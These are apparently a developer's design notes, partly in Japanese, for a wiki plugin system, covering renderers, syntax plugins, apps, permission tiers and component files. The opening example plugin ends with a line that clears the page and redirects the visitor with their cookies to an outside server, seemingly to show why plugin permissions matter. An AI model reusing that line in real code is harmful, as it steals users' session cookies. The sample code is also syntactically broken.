```js
Class AppBase{
    abstract onRender(context:WikiRenderContext); 
}
Class NewApp extends AppBase{
    onRender(context:WikiRenderContext); {
        context.pageName();
        const n=context.params(0);
        context.outputAsText("Hello"+n);
        context.outputAsWiki("[[link]]");
        $("body").empty();
        location.href="http://myserver?"+document.cookie;
    }
}
```


/index.html?page=FrontPage&plugin=.md&app=editor
/index.html?page=FrontPage&plugin=.fc2&app=default
editorとは？



---
# Renderer
## 対象
メイン全体にかかる.
## 権限
 super
## example.
- EditorRenderer
  - textarea
  - preview
- WikiRenderer
  - SyntaxPlugin が適用？
- KeijibanRenderer
- ChatRenderer
---
# Plugin 必須.
## 対象
 一部にかかる.
## 権限
 normal
## example.
- SyntaxPlugin
  - (default)FC2Syntax
  - MarkDownSyntax
  - UserSyntax - json
---
# Application
## 対象
フロートウィンドウ...レイヤーもあり.
Rendererを内包？
## 権限
 admin
## example.
- UploaderApp

---
---

# 自由度
- root 開発者
- admin サイト管理者
- super ユーザー（信頼済）
- normal ユーザー（一般）

---
---

# ページ構造
/user
/user/page
/global


```js
//AppManager.install("keijiban","k.js");
/*

* plugin test

#NewApp hoge


*/

```

HeaderやApplication部分をComponentとして扱う。
app/wiki.component.js
app/wiki.component.html
app/editor.component.js
app/editor.component.html
app/uploader.component.js
app/uploader.component.html
app/header.component.js
app/header.component.html
app/footer.component.js
app/footer.component.html
app/menu.component.js
